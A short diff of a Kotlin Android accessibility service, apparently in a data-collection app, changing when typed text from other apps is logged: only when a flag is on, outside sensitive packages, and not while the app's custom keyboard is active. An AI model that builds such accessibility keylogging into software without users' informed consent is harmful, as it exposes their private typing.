@@ -91,7 +91,10 @@ class DataAccessibilityService : AccessibilityService() {
             }
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 if (keyloggingEnabled && pkg !in sensitivePackages) {
-                    handleTextChanged(event, timestamp, pkg)
+                    val isCustomKeyboardActive = com.pdcollect.app.util.PermissionUtils.isKeyboardActive(this)
+                    if (!isCustomKeyboardActive) {
+                        handleTextChanged(event, timestamp, pkg)
+                    }
                 }
             }
             AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
